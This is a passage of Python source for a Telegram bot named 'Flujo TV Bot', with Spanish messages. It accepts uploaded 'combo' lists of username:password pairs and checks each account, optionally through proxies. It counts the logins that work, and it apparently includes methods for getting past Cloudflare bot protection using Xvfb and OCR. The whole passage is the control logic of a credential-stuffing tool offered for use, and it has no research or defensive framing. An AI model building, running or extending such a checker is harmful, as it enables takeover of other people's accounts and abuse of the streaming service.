            s=f"━━━ <b>FIN</b> ━━━\n📊 {len(accounts)} │ 💰<b>{len(hl)}</b> │ ❌{len(accounts)-len(hl)}\n⏱ {int(el//60)}m{int(el%60)}s"
            if pmid:tg_edit_msg(chat_id,pmid,s,reply_markup=kb_main())
            else:tg_send_msg(chat_id,s,reply_markup=kb_main())
        except Exception as e:
            print(f"  [✗] {e}")
            try:
                tg_send_msg(chat_id,f"❌ <code>{esc(str(e)[:200])}</code>",reply_markup=kb_main())
            except:
                pass

    pr=multiprocessing.Process(target=worker,args=(accounts,chat_id,pmid,use_proxy),daemon=True)
    pr.start();bot_state["_process"]=pr

# ══════════════════════════════════════════════════════════════════[...]
#  UPDATES
# ══════════════════════════════════════════════════════════════════[...]

def process_update(upd):
    global ADMIN_IDS
    msg=upd.get("message");cbq=upd.get("callback_query")
    if msg:
        cid=msg["chat"]["id"];uid=msg.get("from",{}).get("id");txt=msg.get("text","");doc="document" in msg
        if uid and uid not in ADMIN_IDS:ADMIN_IDS.append(uid)
        if cid in waiting_combo:
            waiting_combo.discard(cid);up=not bot_state.get("force_no_proxy",False);bot_state["force_no_proxy"]=False
            if doc:
                fd=tg_download_file(msg["document"]["file_id"])
                if fd:
                    acc=parse_combo(fd.decode("utf-8",errors="ignore"))
                    if acc:tg_send_msg(cid,f"📄 <b>{len(acc)}</b> cuentas");start_check(acc,cid,up)
                    else:tg_send_msg(cid,"❌ Inválidas.",reply_markup=kb_main())
                else:tg_send_msg(cid,"❌ Error.",reply_markup=kb_main())
                return
            elif txt and not txt.startswith("/"):
                acc=parse_combo(txt)
                if acc:start_check(acc,cid,up)
                else:tg_send_msg(cid,"❌ <code>user:pass</code>",reply_markup=kb_main())
                return
            else:waiting_combo.add(cid);tg_send_msg(cid,"📤 Envía combo",reply_markup=kb_cancel());return
        if txt=="/start":tg_send_msg(cid,"🎬 <b>Flujo TV Bot</b>",reply_markup=kb_main())
        elif txt=="/check":
            if bot_state["running"]:tg_send_msg(cid,"⏳",reply_markup=kb_main())
            else:waiting_combo.add(cid);bot_state["force_no_proxy"]=False;tg_send_msg(cid,"📤 Combo (PROXY):",reply_markup=kb_cancel())
        elif txt in ["/local","/checknoproxy"]:
            if bot_state["running"]:tg_send_msg(cid,"⏳",reply_markup=kb_main())
            else:waiting_combo.add(cid);bot_state["force_no_proxy"]=True;tg_send_msg(cid,"🌐 Combo (SIN PROXY):",reply_markup=kb_cancel())
        elif txt=="/testcf":
            if not bot_state["running"]:threading.Thread(target=test_cf,args=(cid,),daemon=True).start()
        elif txt=="/stop":
            if bot_state["running"]:open(STOP_FILE,'w').write("1");tg_send_msg(cid,"⏹ Deteniendo...")
            else:tg_send_msg(cid,"Nada.",reply_markup=kb_main())
        elif txt.startswith("/proxy"):
            p=txt.split()
            if len(p)>=5:PROXY["host"]=p[1];PROXY["port"]=int(p[2]);PROXY["user"]=p[3];PROXY["pass"]=p[4];tg_send_msg(cid,f"🔄 <code>{PROXY['host']}:{PROXY['port']}</code>",reply_markup=kb_main())
    elif cbq:
        cid=cbq["message"]["chat"]["id"];uid=cbq.get("from",{}).get("id");data=cbq.get("data","");mid=cbq["message"]["message_id"]
        if uid and uid not in ADMIN_IDS:ADMIN_IDS.append(uid)
        if data=="send_combo":
            if bot_state["running"]:tg_answer_cb(cbq["id"],"Ocupado",show_alert=True)
            else:waiting_combo.add(cid);bot_state["force_no_proxy"]=False;tg_edit_msg(cid,mid,"📤 Combo (PROXY):",reply_markup=kb_cancel());tg_answer_cb(cbq["id"])
        elif data=="send_local":
            if bot_state["running"]:tg_answer_cb(cbq["id"],"Ocupado",show_alert=True)
            else:waiting_combo.add(cid);bot_state["force_no_proxy"]=True;tg_edit_msg(cid,mid,"🌐 Combo (SIN PROXY):",reply_markup=kb_cancel());tg_answer_cb(cbq["id"])
        elif data=="test_cf":
            if not bot_state["running"]:threading.Thread(target=test_cf,args=(cid,),daemon=True).start()
            else:tg_answer_cb(cbq["id"],"Ocupado",show_alert=True)
        elif data=="stop":
            if bot_state["running"]:open(STOP_FILE,'w').write("1");tg_answer_cb(cbq["id"],"Deteniendo...")
            else:tg_answer_cb(cbq["id"],"Nada",show_alert=True)
        elif data=="cancel_check":waiting_combo.discard(cid);tg_edit_msg(cid,mid,"🎬 Listo.",reply_markup=kb_main());tg_answer_cb(cbq["id"])

# ══════════════════════════════════════════════════════════════════[...]
#  MAIN
# ══════════════════════════════════════════════════════════════════[...]

def main():
    print("\n  ╔═══════════════════════════════════════════════════╗")
    print("  ║  🎬 Flujo TV Bot — 5 métodos CF + Xvfb         ║")
    print("  ╚═══════════════════════════════════════════════════╝\n")
    pw_ok,ocr_ok=setup_deps()
    if not pw_ok:sys.exit(1)
    d=os.environ.get("DISPLAY",":99")
    try:
        r=subprocess.run(["xdpyinfo"],capture_output=True,text=True,timeout=5)
        if r.returncode!=0:subprocess.Popen(["Xvfb",d,"-screen","0","1280x1024x24","-ac"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL);time.sleep(2)
    except:subprocess.Popen(["Xvfb",d,"-screen","0","1280x1024x24","-ac"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL);time.sleep(2)
    print(f"  [✓] Listo | OCR:{'✅' if ocr_ok else '❌'} | Xvfb:{d}")
    print(f"  [✓] /check /local /testcf /stop\n")
    tg_api("deleteWebhook",{"drop_pending_updates":True})
    print("  [✓] Bot listo.\n")
    offset=None
    while True:
        if bot_state["running"] and bot_state.get("_process") and not bot_state["_process"].is_alive():
            bot_state["running"]=False;bot_state["current_chat"]=None;print("  [*] Check fin.")
        try:
            params={"timeout":35,"allowed_updates":'["message","callback_query"]'}
            if offset:params["offset"]=offset
            result=tg_api("getUpdates",params,timeout=40)
            if result.get("ok") and result.get("result"):
                for upd in result["result"]:
                    try:process_update(upd)
                    except:pass
                    offset=upd["update_id"]+1
        except:time.sleep(3)

if __name__=="__main__":
    try:main()
    except KeyboardInterrupt:print("\n  [*] Stop.")
    except Exception as e:print(f"\n  [✗] {e}");traceback.print_exc()
